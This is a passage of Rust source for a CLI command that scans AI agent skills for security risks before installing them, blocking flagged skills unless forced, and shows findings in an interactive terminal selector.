use std::collections::BTreeSet;
use std::fs;
use std::io::{IsTerminal, Write};
use std::path::{Path, PathBuf};

use crossterm::cursor::{Hide, Show};
use crossterm::event::{self, Event, KeyCode, KeyEvent, KeyEventKind, KeyModifiers};
use crossterm::execute;
use crossterm::terminal::{
    EnterAlternateScreen, LeaveAlternateScreen, disable_raw_mode, enable_raw_mode, size,
};
use ratatui::backend::CrosstermBackend;
use ratatui::layout::{Constraint, Layout, Rect};
use ratatui::style::{Modifier, Style, Stylize};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Block, Borders, Clear, List, ListItem, Paragraph, Wrap};
use ratatui::{Frame, Terminal};
use sentra_lib::agents::{Agent, discover_agents};
use sentra_lib::interfaces::{Finding, RiskCategory, RiskSeverity, SkillData};
use sentra_lib::risks::{RiskAsset, RiskScanner};
use sentra_lib::{
    SentraError, SentraResult, collect_skill_manifests_from_dir_async, stage_skill_source,
};
use serde::Serialize;

use crate::cli::args::ScanChecker;
use crate::cli::feedback::{self, Status};
use crate::cli::i18n::t;
use crate::cli::output::print_json;
use crate::core::agent_filter::agent_matches;
use crate::core::scan_support::{
    RuleLoadOutput, build_scan_options, checker_selection, emit_scan_progress,
    finish_scan_progress, load_scanner_rules,
};
use crate::tui::theme;

pub(crate) async fn add(
    source: String,
    agent_filters: Vec<String>,
    enabled_checkers: BTreeSet<ScanChecker>,
    force: bool,
) -> SentraResult<()> {
    let home = current_home()?;
    feedback::context(
        t("Install skills", "安装技能"),
        &[
            (t("Source", "来源"), source.clone()),
            (
                t("Mode", "模式"),
                if force {
                    t("force enabled", "强制安装").to_string()
                } else {
                    t("risk-gated", "风险拦截").to_string()
                },
            ),
        ],
    );
    feedback::phase(
        Status::Running,
        format!("{}: {source}", t("Fetch skill source", "获取技能来源")),
    );
    let staged = stage_skill_source(&source)?;
    feedback::phase(
        Status::Success,
        format!(
            "{}: {}",
            t("Skill source staged", "技能来源已暂存"),
            staged.path().display()
        ),
    );
    feedback::phase(
        Status::Running,
        format!(
            "{}: {}",
            t("Discover skills from", "发现技能，来源"),
            staged.path().display()
        ),
    );
    let discovered = collect_skill_manifests_from_dir_async(staged.path()).await?;
    if discovered.is_empty() {
        return Err(SentraError::Message(format!(
            "{}: {}",
            t("no skills found in", "未发现技能"),
            staged.path().display()
        )));
    }
    let total = discovered.len();
    feedback::phase(
        Status::Success,
        format!(
            "{} {total} {}",
            t("Discovered", "已发现"),
            t("skill(s)", "个技能")
        ),
    );

    let checkers = checker_selection(&enabled_checkers);
    let mut skills = Vec::with_capacity(total);
    let interactive_progress = std::io::stderr().is_terminal();
    let mut scanner = RiskScanner::new(build_scan_options(&home, &checkers)?)?;
    feedback::phase(
        Status::Running,
        t("Load risk rules before installation", "安装前加载风险规则"),
    );
    load_scanner_rules(
        &mut scanner,
        RuleLoadOutput::for_terminal(interactive_progress),
    )?;
    feedback::phase(Status::Success, t("Risk rules loaded", "风险规则已加载"));
    let mut progress_width = 0usize;
    for (index, skill) in discovered.into_iter().enumerate() {
        emit_scan_progress(
            "skill",
            t("Scanning skills", "正在扫描技能"),
            index + 1,
            total,
            &skill.name,
            interactive_progress,
            &mut progress_width,
        )?;
        let report = scanner.scan(RiskAsset::from(&skill)).await?;
        let risk_details = risk_detail_items(skill.home.as_deref(), &report.findings);
        skills.push(InstallableSkill {
            data: skill,
            blocked: is_risky(&report),
            critical: report.summary.critical,
            high: report.summary.high,
            medium: report.summary.medium,
            low: report.summary.low,
            risk_details,
        });
    }
    finish_scan_progress(
        total,
        "skill",
        "skills",
        interactive_progress,
        progress_width,
    )?;

    let should_prompt = should_prompt_for_skills();
    if !force && !should_prompt && skills.iter().any(|skill| skill.blocked) {
        return Err(SentraError::Message(
            t(
                "risk findings block installation; rerun with --force to install anyway",
                "存在风险发现，已阻止安装；如仍需安装，请使用 --force 重新运行",
            )
            .to_string(),
        ));
    }

    let agents = resolve_target_agents(&home, &agent_filters)?;
    let selected_skill_indices = if should_prompt {
        prompt_skills(&skills, force)?
    } else {
        (0..skills.len()).collect()
    };
    if selected_skill_indices.is_empty() {
        feedback::phase(
            Status::Warning,
            t(
                "No skills selected; nothing installed.",
                "未选择技能，未安装任何内容。",
            ),
        );
        return Ok(());
    }

    let target_agents = if agents.is_empty() {
        prompt_agents(discover_agents(&home))?
    } else {
        agents
    };
    if target_agents.is_empty() {
        feedback::status_line(
            Status::Warning,
            t(
                "No target agents selected; nothing installed.",
                "未选择目标 Agent，未安装任何内容。",
            ),
        );
        return Ok(());
    }

    let mut installed = Vec::new();
    let total_copies = selected_skill_indices.len() * target_agents.len();
    let mut current_copy = 0usize;
    for skill_index in selected_skill_indices {
        let skill = &mut skills[skill_index];
        for agent in &target_agents {
            current_copy += 1;
            feedback::counted_action(
                current_copy,
                total_copies,
                t("Install skill copy", "安装技能副本"),
                format!("{} -> {}", skill.data.name, agent.name()),
            );
            let path = install_skill_to_agent(agent, &skill.data)?;
            installed.push(InstallRecord {
                skill: skill.data.name.clone(),
                agent: agent.name().to_string(),
                path,
            });
        }
    }

    feedback::result(
        Status::Success,
        format!(
            "{} {}",
            t("Installed skill copies", "已安装技能副本"),
            installed.len()
        ),
        &[],
    );
    print_install_summary(InstallSummary { installed })
}

pub(crate) async fn list() -> SentraResult<()> {
    crate::tui::skill_manager::run().await
}

fn is_risky(report: &sentra_lib::risks::ScanReport) -> bool {
    !report.findings.is_empty()
}

fn risk_detail_items(skill_home: Option<&Path>, findings: &[Finding]) -> Vec<RiskFindingDetail> {
    if findings.is_empty() {
        return Vec::new();
    }

    let mut findings = findings.iter().collect::<Vec<_>>();
    findings.sort_by_key(|finding| std::cmp::Reverse(finding.severity));
    findings
        .into_iter()
        .take(10)
        .map(|finding| RiskFindingDetail::from_finding(skill_home, finding))
        .collect()
}

fn finding_context_lines(
    skill_home: Option<&Path>,
    file: &str,
    target_line: usize,
    fallback_context: Option<&str>,
) -> Vec<ContextLine> {
    if target_line == 0 {
        return context_from_text(fallback_context, target_line);
    }

    if let Some(path) = resolve_finding_file(skill_home, file)
        && let Ok(content) = fs::read_to_string(path)
    {
        return context_window_from_content(&content, target_line, 2, 2);
    }

    context_from_text(fallback_context, target_line)
}

fn resolve_finding_file(skill_home: Option<&Path>, file: &str) -> Option<PathBuf> {
    let path = PathBuf::from(file);
    if path.is_absolute() {
        return Some(path);
    }
    skill_home.map(|home| home.join(path))
}

fn context_window_from_content(
    content: &str,
    target_line: usize,
    before: usize,
    after: usize,
) -> Vec<ContextLine> {
    let lines = content.lines().collect::<Vec<_>>();
    if lines.is_empty() {
        return Vec::new();
    }
    let target = target_line.saturating_sub(1).min(lines.len() - 1);
    let start = target.saturating_sub(before);
    let end = usize::min(target + after + 1, lines.len());
    lines[start..end]
        .iter()
        .enumerate()
        .map(|(offset, text)| {
            let line_number = start + offset + 1;
            ContextLine {
                number: Some(line_number),
                text: truncate_detail(text, 140),
                is_target: line_number == target_line,
            }
        })
        .collect()
}

fn context_from_text(context: Option<&str>, target_line: usize) -> Vec<ContextLine> {
    context
        .into_iter()
        .flat_map(|context| context.lines())
        .take(8)
        .enumerate()
        .map(|(index, text)| {
            let number = if target_line == 0 {
                None
            } else {
                Some(target_line + index)
            };
            ContextLine {
                number,
                text: truncate_detail(text, 140),
                is_target: index == 0,
            }
        })
        .collect()
}

fn severity_label(severity: RiskSeverity) -> &'static str {
    match severity {
        RiskSeverity::Critical => "CRITICAL",
        RiskSeverity::High => "HIGH",
        RiskSeverity::Medium => "MEDIUM",
        RiskSeverity::Low => "LOW",
        RiskSeverity::Info => "INFO",
    }
}

fn category_label(category: RiskCategory) -> &'static str {
    match category {
        RiskCategory::PromptInjection => "PROMPT_INJECTION",
        RiskCategory::DataExfiltration => "DATA_EXFILTRATION",
        RiskCategory::PrivilegeEscalation => "PRIVILEGE_ESCALATION",
        RiskCategory::NetworkAccess => "NETWORK_ACCESS",
        RiskCategory::FileSystem => "FILE_SYSTEM",
        RiskCategory::CredentialExposure => "CREDENTIAL_EXPOSURE",
        RiskCategory::SupplyChain => "SUPPLY_CHAIN",
        RiskCategory::Misconfiguration => "MISCONFIGURATION",
        RiskCategory::Polyglot => "POLYGLOT",
        RiskCategory::MaliciousExecution => "MALICIOUS_EXECUTION",
        RiskCategory::CryptoMining => "CRYPTO_MINING",
        RiskCategory::WebShell => "WEB_SHELL",
        RiskCategory::HackTool => "HACK_TOOL",
        RiskCategory::Exploit => "EXPLOIT",
    }
}

fn truncate_detail(value: &str, max_chars: usize) -> String {
    let mut out = value.chars().take(max_chars).collect::<String>();
    if value.chars().count() > max_chars {
        out.push_str("...");
    }
    out
}

fn print_install_summary(summary: InstallSummary) -> SentraResult<()> {
    if !std::io::stdout().is_terminal() {
        return print_json(summary);
    }

    let text = render_install_summary(&summary);
    let mut stdout = std::io::stdout().lock();
    if let Err(err) = write!(stdout, "{text}") {
        if err.kind() == std::io::ErrorKind::BrokenPipe {
            return Ok(());
        }
        return Err(SentraError::io(None, err));
    }
    Ok(())
}

fn render_install_summary(summary: &InstallSummary) -> String {
    let mut out = String::new();
    let count = summary.installed.len();
    if count == 1 {
        out.push_str(t("Installed 1 skill copy", "已安装 1 份技能副本"));
    } else {
        out.push_str(&format!(
            "{} {count} {}",
            t("Installed", "已安装"),
            t("skill copies", "份技能副本")
        ));
    }
    out.push('\n');

    let agent_width = summary
        .installed
        .iter()
        .map(|record| record.agent.len())
        .max()
        .unwrap_or(0);
    let mut current_skill: Option<&str> = None;
    for record in &summary.installed {
        if current_skill != Some(record.skill.as_str()) {
            current_skill = Some(record.skill.as_str());
            out.push('\n');
            out.push_str(&record.skill);
            out.push('\n');
        }
        out.push_str("  ");
        out.push_str(&format!("{:<agent_width$}", record.agent));
        out.push_str("  ");
        out.push_str(&record.path.display().to_string());
        out.push('\n');
    }

    out
}

fn resolve_target_agents(home: &std::path::Path, filters: &[String]) -> SentraResult<Vec<Agent>> {
    if filters.is_empty() {
        if std::io::stdin().is_terminal() && std::io::stdout().is_terminal() {
            return Ok(Vec::new());
        }
        return Err(SentraError::Message(
            "missing --agent <name>; interactive agent selection requires a terminal".to_string(),
        ));
    }

    let agents = discover_agents(home);
    let mut selected = Vec::new();
    for filter in filters {
        let matches = agents
            .iter()
            .filter(|agent| agent_matches(filter, agent.name()))
            .cloned()
            .collect::<Vec<_>>();
        if matches.is_empty() {
            return Err(SentraError::Message(format!(
                "{}: {filter}",
                t("agent not found", "未找到 Agent")
            )));
        }
        selected.extend(matches);
    }
    selected.sort_by(|left, right| {
        left.name()
            .cmp(right.name())
            .then(left.home().cmp(right.home()))
    });
    selected.dedup_by(|left, right| left.name() == right.name() && left.home() == right.home());
    Ok(selected)
}

fn install_skill_to_agent(agent: &Agent, skill: &SkillData) -> SentraResult<PathBuf> {
    let Some(source) = &skill.home else {
        return Err(SentraError::Message(format!(
            "skill {:?} has no source path",
            skill.name
        )));
    };
    let dest = agent.home().join("skills").join(skill_dir_name(skill));
    copy_dir_all(source, &dest)?;
    Ok(dest)
}

fn skill_dir_name(skill: &SkillData) -> String {
    skill
        .home
        .as_ref()
        .and_then(|home| home.file_name())
        .and_then(|name| name.to_str())
        .filter(|name| !name.is_empty())
        .map(str::to_string)
        .unwrap_or_else(|| sanitize_name(&skill.name))
}

fn sanitize_name(name: &str) -> String {
    let value = name
        .chars()
        .map(|ch| {
            if ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' {
                ch
            } else {
                '-'
            }
        })
        .collect::<String>();
    let value = value.trim_matches('-').to_string();
    if value.is_empty() {
        "skill".to_string()
    } else {
        value
    }
}

fn copy_dir_all(src: &Path, dst: &Path) -> SentraResult<()> {
    if dst.exists() {
        fs::remove_dir_all(dst).map_err(|err| SentraError::io(Some(dst.to_path_buf()), err))?;
    }
    fs::create_dir_all(dst).map_err(|err| SentraError::io(Some(dst.to_path_buf()), err))?;
    for entry in fs::read_dir(src).map_err(|err| SentraError::io(Some(src.to_path_buf()), err))? {
        let entry = entry.map_err(|err| SentraError::io(Some(src.to_path_buf()), err))?;
        let file_type = entry
            .file_type()
            .map_err(|err| SentraError::io(Some(entry.path()), err))?;
        let target = dst.join(entry.file_name());
        if file_type.is_dir() {
            copy_dir_all(&entry.path(), &target)?;
        } else if file_type.is_file() {
            fs::copy(entry.path(), &target)
                .map_err(|err| SentraError::io(Some(target.clone()), err))?;
        }
    }
    Ok(())
}

fn should_prompt_for_skills() -> bool {
    std::io::stdin().is_terminal() && std::io::stdout().is_terminal()
}

fn prompt_skills(skills: &[InstallableSkill], force: bool) -> SentraResult<Vec<usize>> {
    let rows = skills
        .iter()
        .map(|skill| {
            let details = vec![
                format!(
                    "version: {}",
                    skill.data.version.as_deref().unwrap_or("unknown")
                ),
                format!(
                    "path: {}",
                    skill
                        .data
                        .home
                        .as_ref()
                        .map(|path| path.display().to_string())
                        .unwrap_or_else(|| "unknown".to_string())
                ),
                format!(
                    "risk summary: critical={} high={} medium={} low={}",
                    skill.critical, skill.high, skill.medium, skill.low
                ),
            ];
            SelectRow {
                title: skill.data.name.clone(),
                subtitle: skill.data.description.clone().unwrap_or_default(),
                details,
                risk_findings: skill.risk_details.clone(),
                disabled: skill.blocked && !force,
                disabled_reason: (skill.blocked && !force)
                    .then(|| "risk findings require --force".to_string()),
            }
        })
        .collect::<Vec<_>>();
    multi_select(
        "Select skills",
        "Dangerous skills are disabled unless --force is set.",
        &rows,
    )
}

fn prompt_agents(agents: Vec<Agent>) -> SentraResult<Vec<Agent>> {
    let rows = agents
        .iter()
        .map(|agent| SelectRow {
            title: format!("{} ({})", agent.title(), agent.name()),
            subtitle: agent.home().display().to_string(),
            details: vec![
                format!("name: {}", agent.name()),
                format!("title: {}", agent.title()),
                format!("home: {}", agent.home().display()),
            ],
            risk_findings: Vec::new(),
            disabled: false,
            disabled_reason: None,
        })
        .collect::<Vec<_>>();
    let selected = multi_select(
        "Select agents",
        "These agents will receive copies under their skills directory.",
        &rows,
    )?;
    Ok(selected
        .into_iter()
        .filter_map(|index| agents.get(index).cloned())
        .collect())
}

fn multi_select(title: &str, subtitle: &str, rows: &[SelectRow]) -> SentraResult<Vec<usize>> {
    if rows.is_empty() {
        return Ok(Vec::new());
    }

    let mut terminal = TerminalGuard::enter()?;
    let mut state = SelectorState::new(rows);

    loop {
        terminal.draw(|frame| render_selector(frame, title, subtitle, rows, &state))?;
        match state.handle_key(rows, read_key()?) {
            SelectorAction::Continue if !state.selected.is_empty() => {
                return Ok(state.selected.into_iter().collect());
            }
            SelectorAction::Continue => {}
            SelectorAction::Cancel => {
                return Ok(Vec::new());
            }
            SelectorAction::None => {}
        }
    }
}

fn render_selector(
    frame: &mut Frame<'_>,
    title: &str,
    subtitle: &str,
    rows: &[SelectRow],
    state: &SelectorState,
) {
    let area = frame.area();
    frame.render_widget(Clear, area);

    if area.width < 80 || area.height < 24 {
        let message = Paragraph::new(vec![
            Line::from(title.bold()),
            Line::from(""),
            Line::from(
                t(
                    "Terminal too small. Resize to at least 80x24.",
                    "终端太小，请调整到至少 80x24。",
                )
                .dim(),
            ),
        ])
        .block(Block::default().borders(Borders::ALL));
        frame.render_widget(message, area);
        return;
    }

    let [header_area, body_area, footer_area] = Layout::vertical([
        Constraint::Length(5),
        Constraint::Min(10),
        Constraint::Length(if state.show_help { 3 } else { 1 }),
    ])
    .areas(area);

    render_header(frame, header_area, title, subtitle, state);

    let [list_area, detail_area] =
        Layout::horizontal(selector_columns(body_area.width, rows, state))
            .spacing(1)
            .areas(body_area);
    render_list(frame, list_area, rows, state);
    render_detail(frame, detail_area, rows, state);
    render_footer(frame, footer_area, state);
}

fn render_header(
    frame: &mut Frame<'_>,
    area: Rect,
    title: &str,
    subtitle: &str,
    state: &SelectorState,
) {
    let search_prefix = if state.search_mode { "/ " } else { "> " };
    let lines = vec![
        Line::from(title.bold()),
        Line::from(subtitle.dim()),
        Line::from(t("Type to search", "输入以搜索").dim()),
        Line::from(vec![
            Span::styled(search_prefix, theme::muted_style()),
            Span::raw(state.search.as_str()),
        ]),
    ];
    frame.render_widget(Paragraph::new(lines).block(Block::default()), area);
}

fn render_list(frame: &mut Frame<'_>, area: Rect, rows: &[SelectRow], state: &SelectorState) {
    let visible = state.visible_indices(rows);
    let focus_pos = visible
        .iter()
        .position(|index| *index == state.focus)
        .unwrap_or(0);
    let max_rows = area.height.saturating_sub(2) as usize;
    let start = focus_pos.saturating_sub(max_rows.saturating_sub(1));
    let items = visible
        .iter()
        .skip(start)
        .take(max_rows)
        .map(|index| list_item(*index, rows, state))
        .collect::<Vec<_>>();

    let list = if items.is_empty() {
        List::new(vec![ListItem::new(Line::from(
            t("no matches", "无匹配项").italic().dim(),
        ))])
    } else {
        List::new(items)
    }
    .block(
        Block::default()
            .borders(Borders::ALL)
            .title(t("Items", "项目"))
            .border_style(theme::border_style(state.focus_pane == FocusPane::List)),
    );
    frame.render_widget(list, area);
}

fn selector_columns(
    total_width: u16,
    rows: &[SelectRow],
    state: &SelectorState,
) -> [Constraint; 2] {
    let list_width = dynamic_list_width(total_width, rows, state);
    [Constraint::Length(list_width), Constraint::Min(24)]
}

fn dynamic_list_width(total_width: u16, rows: &[SelectRow], state: &SelectorState) -> u16 {
    let longest = state
        .visible_indices(rows)
        .into_iter()
        .filter_map(|index| rows.get(index))
        .map(|row| display_width(&row.title))
        .max()
        .unwrap_or(t("no matches", "无匹配项").len());
    let desired = longest.saturating_add(8) as u16;
    let max_by_ratio = total_width.saturating_mul(40).saturating_div(100);
    let max_width = max_by_ratio.min(48).max(18);
    let min_width = total_width.saturating_sub(25).min(18);
    desired.clamp(min_width, max_width)
}

fn display_width(value: &str) -> usize {
    value.chars().map(char_display_width).sum()
}

fn list_item<'a>(index: usize, rows: &'a [SelectRow], state: &SelectorState) -> ListItem<'a> {
    let row = &rows[index];
    let pointer = if index == state.focus { "> " } else { "  " };
    let marker = if state.selected.contains(&index) {
        "[x]"
    } else {
        "[ ]"
    };
    let has_risk = !row.risk_findings.is_empty();
    let title_style = if has_risk {
        risk_row_style(row)
    } else if row.disabled {
        theme::muted_style()
    } else {
        Style::default()
    };
    let spans = vec![
        Span::styled(pointer, focus_pointer_style(index, state)),
        Span::styled(marker, marker_style(index, state, has_risk)),
        Span::raw(" "),
        Span::styled(row.title.as_str(), title_style),
    ];

    let mut line = Line::from(spans);
    if index == state.focus {
        line = line.patch_style(Style::default().add_modifier(Modifier::BOLD));
        if row.disabled && !has_risk {
            line = line.dim();
        }
    } else if row.disabled {
        line = line.patch_style(theme::muted_style());
    }
    ListItem::new(line)
}

fn focus_pointer_style(index: usize, state: &SelectorState) -> Style {
    if index == state.focus {
        theme::focus_style()
    } else {
        theme::muted_style()
    }
}

fn marker_style(index: usize, state: &SelectorState, has_risk: bool) -> Style {
    if has_risk {
        theme::warning_style().add_modifier(Modifier::BOLD)
    } else if state.selected.contains(&index) {
        theme::success_style()
    } else {
        theme::muted_style()
    }
}

fn risk_row_style(row: &SelectRow) -> Style {
    let max_severity = row
        .risk_findings
        .iter()
        .map(|finding| finding.severity)
        .max()
        .unwrap_or(RiskSeverity::Info);
    severity_style(max_severity).add_modifier(Modifier::BOLD)
}

fn render_detail(frame: &mut Frame<'_>, area: Rect, rows: &[SelectRow], state: &SelectorState) {
    let Some(row) = rows.get(state.focus) else {
        let empty = Paragraph::new(t("No item selected", "未选择项目"))
            .block(Block::default().borders(Borders::ALL).title("Details"));
        frame.render_widget(empty, area);
        return;
    };

    let lines = detail_lines_for_width(row, state, area.width.saturating_sub(2) as usize);

    let max_scroll = detail_max_scroll(row, state, area.height, area.width);
    let scroll = state.detail_scroll.min(max_scroll);
    let detail = Paragraph::new(lines)
        .block(
            Block::default()
                .borders(Borders::ALL)
                .title("Details")
                .border_style(theme::border_style(state.focus_pane == FocusPane::Details)),
        )
        .scroll((scroll, 0))
        .wrap(Wrap { trim: false });
    frame.render_widget(detail, area);
}

fn detail_max_scroll(
    row: &SelectRow,
    state: &SelectorState,
    area_height: u16,
    area_width: u16,
) -> u16 {
    let visible_height = area_height.saturating_sub(2);
    let content_width = area_width.saturating_sub(2).max(1) as usize;
    let line_count = wrapped_line_count(
        &detail_lines_for_width(row, state, content_width),
        content_width,
    ) as u16;
    line_count.saturating_sub(visible_height)
}

fn wrapped_line_count(lines: &[Line<'_>], content_width: usize) -> usize {
    lines
        .iter()
        .map(|line| line.width().div_ceil(content_width).max(1))
        .sum()
}

fn detail_view_height() -> u16 {
    size()
        .map(|(_, height)| {
            let footer_height = 3;
            height
                .saturating_sub(5)
                .saturating_sub(footer_height)
                .max(1)
        })
        .unwrap_or(24)
}

fn detail_view_width(rows: &[SelectRow], state: &SelectorState) -> u16 {
    size()
        .map(|(width, _)| {
            let list_width = dynamic_list_width(width, rows, state);
            width.saturating_sub(list_width).saturating_sub(1).max(1)
        })
        .unwrap_or(80)
}

fn detail_page_size() -> isize {
    detail_view_height().saturating_sub(3).max(1) as isize
}

#[derive(Clone, Copy, Debug)]
struct DetailLayout {
    text_width: usize,
    context_text_width: usize,
}

impl DetailLayout {
    fn new(content_width: usize) -> Self {
        let text_width = content_width.saturating_sub(2).max(1);
        Self {
            text_width,
            context_text_width: content_width.saturating_sub(CONTEXT_GUTTER_WIDTH).max(1),
        }
    }
}

const MIN_CONTEXT_LINE_NUMBER_WIDTH: usize = 3;
const CONTEXT_GUTTER_WIDTH: usize = MIN_CONTEXT_LINE_NUMBER_WIDTH + 5;

#[cfg(test)]
const DEFAULT_DETAIL_WIDTH: usize = 96;

#[cfg(test)]
fn detail_lines(row: &SelectRow, state: &SelectorState) -> Vec<Line<'static>> {
    detail_lines_for_width(row, state, DEFAULT_DETAIL_WIDTH)
}

fn detail_lines_for_width(
    row: &SelectRow,
    state: &SelectorState,
    content_width: usize,
) -> Vec<Line<'static>> {
    let layout = DetailLayout::new(content_width);
    let status = if row.disabled {
        row.disabled_reason
            .as_deref()
            .unwrap_or(t("disabled", "已禁用"))
            .to_string()
    } else if state.selected.contains(&state.focus) {
        t("selected", "已选择").to_string()
    } else {
        t("not selected", "未选择").to_string()
    };

    let mut lines = vec![
        Line::from(row.title.clone()).bold(),
        Line::from(row.subtitle.clone()).dim(),
        Line::from(""),
        labeled_line(t("Status", "状态"), status, status_style(row, state)),
    ];

    for detail in &row.details {
        if let Some((label, value)) = detail.split_once(':') {
            lines.push(labeled_line(
                label.trim(),
                value.trim().to_string(),
                Style::default(),
            ));
        } else {
            lines.push(Line::from(detail.clone()));
        }
    }

    if row.risk_findings.is_empty() {
        lines.push(Line::from(""));
        lines.push(Line::from(t("Risk", "风险")).bold());
        lines.push(Line::from(t("No risk findings", "无风险发现")).style(theme::success_style()));
        return lines;
    }

    lines.push(Line::from(""));
    lines.push(
        Line::from(format!(
            "{} ({})",
            t("Risks", "风险"),
            row.risk_findings.len()
        ))
        .style(theme::warning_style().add_modifier(Modifier::BOLD)),
    );
    let total = row.risk_findings.len();
    for (index, finding) in row.risk_findings.iter().enumerate() {
        if index > 0 {
            lines.push(Line::from(""));
        }
        lines.extend(risk_finding_lines(index + 1, total, finding, layout));
    }
    lines
}

fn labeled_line(label: &str, value: String, value_style: Style) -> Line<'static> {
    Line::from(vec![
        Span::styled(format!("{label:<12}: "), theme::muted_style()),
        Span::styled(value, value_style),
    ])
}

fn status_style(row: &SelectRow, state: &SelectorState) -> Style {
    if row.disabled {
        theme::warning_style().add_modifier(Modifier::BOLD)
    } else if state.selected.contains(&state.focus) {
        theme::success_style().add_modifier(Modifier::BOLD)
    } else {
        theme::muted_style()
    }
}

fn risk_finding_lines(
    index: usize,
    total: usize,
    finding: &RiskFindingDetail,
    layout: DetailLayout,
) -> Vec<Line<'static>> {
    let mut lines = vec![
        Line::from(vec![
            Span::styled(format!("# {index}/{total}"), theme::focus_style()),
            Span::raw("  "),
            Span::styled(
                finding.title.clone(),
                severity_style(finding.severity).add_modifier(Modifier::BOLD),
            ),
        ]),
        detail_field_line(
            t("Title", "标题"),
            finding.title.clone(),
            severity_style(finding.severity).add_modifier(Modifier::BOLD),
        ),
        detail_field_line(
            t("Severity", "严重性"),
            severity_label(finding.severity).to_string(),
            severity_style(finding.severity),
        ),
        detail_field_line(
            t("Category", "类别"),
            category_label(finding.category).to_string(),
            theme::info_style(),
        ),
        detail_field_line(
            t("Checker", "检查器"),
            finding.checker.clone(),
            Style::default(),
        ),
    ];
    lines.extend(multiline_detail_lines(
        t("File", "文件"),
        &format_location(finding),
        Style::default(),
        layout,
    ));

    if !finding.description.trim().is_empty() {
        lines.extend(multiline_detail_lines(
            t("Description", "描述"),
            &finding.description,
            Style::default(),
            layout,
        ));
    }
    if let Some(evidence) = finding
        .evidence
        .as_deref()
        .filter(|value| !value.trim().is_empty())
    {
        lines.extend(multiline_detail_lines(
            t("Evidence", "证据"),
            evidence,
            theme::warning_style(),
            layout,
        ));
    }
    if !finding.remediation.trim().is_empty() {
        lines.extend(multiline_detail_lines(
            t("Fix", "修复"),
            &finding.remediation,
            Style::default(),
            layout,
        ));
    }
    if !finding.context.is_empty() {
        lines.push(detail_section_label(t("Context", "上下文")));
        let number_width = context_number_width(&finding.context);
        for context in &finding.context {
            lines.extend(context_lines(context, layout, number_width));
        }
    }
    lines
}

fn detail_field_line(label: &str, value: String, value_style: Style) -> Line<'static> {
    Line::from(vec![
        Span::styled(format!("{label}: "), theme::muted_style()),
        Span::styled(value, value_style),
    ])
}

fn multiline_detail_lines(
    label: &str,
    value: &str,
    value_style: Style,
    layout: DetailLayout,
) -> Vec<Line<'static>> {
    let prefix = format!("{label}: ");
    let prefix_width = display_width(&prefix);
    let first_width = layout.text_width.saturating_sub(prefix_width).max(1);
    let wrapped = wrap_text_with_first_width(value.trim(), first_width, layout.text_width);
    if wrapped.is_empty() {
        return vec![Line::from(Span::styled(
            format!("{label}:"),
            theme::muted_style(),
        ))];
    }
    let mut lines = Vec::with_capacity(wrapped.len());
    for (index, line) in wrapped.into_iter().enumerate() {
        if index == 0 {
            lines.push(Line::from(vec![
                Span::styled(prefix.clone(), theme::muted_style()),
                Span::styled(line, value_style),
            ]));
        } else {
            lines.push(Line::from(Span::styled(line, value_style)));
        }
    }
    lines
}

fn detail_section_label(label: &str) -> Line<'static> {
    Line::from(vec![Span::styled(
        format!("{label}:"),
        theme::muted_style(),
    )])
}

fn wrap_text(value: &str, width: usize) -> Vec<String> {
    let width = width.max(1);
    value
        .lines()
        .flat_map(|line| wrap_single_line(line, width))
        .collect()
}

fn wrap_text_with_first_width(value: &str, first_width: usize, rest_width: usize) -> Vec<String> {
    let first_width = first_width.max(1);
    let rest_width = rest_width.max(1);
    let mut chunks = Vec::new();
    let mut is_first = true;
    for line in value.lines() {
        let width = if is_first { first_width } else { rest_width };
        let mut line_chunks = wrap_single_line(line, width);
        if line_chunks.is_empty() {
            line_chunks.push(String::new());
        }
        chunks.extend(line_chunks);
        is_first = false;
    }
    chunks
}

fn wrap_single_line(line: &str, width: usize) -> Vec<String> {
    if line.is_empty() {
        return vec![String::new()];
    }
    let mut chunks = Vec::new();
    let mut current = String::new();
    let mut current_width = 0usize;
    for ch in line.chars() {
        let char_width = char_display_width(ch);
        if current_width > 0 && current_width + char_width > width {
            chunks.push(std::mem::take(&mut current));
            current_width = 0;
        }
        current.push(ch);
        current_width += char_width;
    }
    if !current.is_empty() {
        chunks.push(current);
    }
    chunks
}

fn char_display_width(ch: char) -> usize {
    if ch == '\t' {
        4
    } else if ch.is_ascii() {
        1
    } else {
        2
    }
}

fn format_location(finding: &RiskFindingDetail) -> String {
    match finding.column {
        Some(column) => format!("{}:{}:{}", finding.file, finding.line, column),
        None => format!("{}:{}", finding.file, finding.line),
    }
}

fn context_lines(
    context: &ContextLine,
    layout: DetailLayout,
    number_width: usize,
) -> Vec<Line<'static>> {
    let number_width = number_width.max(MIN_CONTEXT_LINE_NUMBER_WIDTH);
    let marker = if context.is_target { '>' } else { ' ' };
    let gutter = match context.number {
        Some(number) => context_gutter(marker, Some(number), number_width),
        None => context_gutter(marker, None, number_width),
    };
    let context_text_width = layout
        .context_text_width
        .saturating_sub(number_width.saturating_sub(MIN_CONTEXT_LINE_NUMBER_WIDTH))
        .max(1);
    let style = if context.is_target {
        theme::warning_style().add_modifier(Modifier::BOLD)
    } else {
        theme::muted_style()
    };
    let wrapped = wrap_text(&context.text, context_text_width);
    if wrapped.is_empty() {
        return vec![Line::from(Span::styled(gutter, style))];
    }
    wrapped
        .into_iter()
        .enumerate()
        .map(|(index, text)| {
            let gutter = if index == 0 {
                gutter.clone()
            } else {
                context_gutter(' ', None, number_width)
            };
            Line::from(vec![Span::styled(gutter, style), Span::styled(text, style)])
        })
        .collect()
}

fn context_number_width(context: &[ContextLine]) -> usize {
    context
        .iter()
        .filter_map(|line| line.number)
        .map(decimal_width)
        .max()
        .unwrap_or(MIN_CONTEXT_LINE_NUMBER_WIDTH)
        .max(MIN_CONTEXT_LINE_NUMBER_WIDTH)
}

fn decimal_width(number: usize) -> usize {
    number.to_string().len()
}

fn context_gutter(marker: char, number: Option<usize>, number_width: usize) -> String {
    let number_width = number_width.max(MIN_CONTEXT_LINE_NUMBER_WIDTH);
    match number {
        Some(number) => format!("{marker} {number:>number_width$} | "),
        None => format!("{}| ", " ".repeat(number_width + 3)),
    }
}

fn severity_style(severity: RiskSeverity) -> Style {
    theme::severity_style(severity)
}

fn render_footer(frame: &mut Frame<'_>, area: Rect, state: &SelectorState) {
    let lines = if state.show_help {
        vec![
            Line::from(
                "[Tab] focus  [Space] toggle  [Enter] continue  [/] search  [?] help  [Esc/Ctrl+C] cancel",
            ),
            Line::from("[List] j/k move  PgUp/PgDn page  Home/End jump  [Details] j/k scroll"),
            Line::from(state.status_line()).dim(),
        ]
    } else {
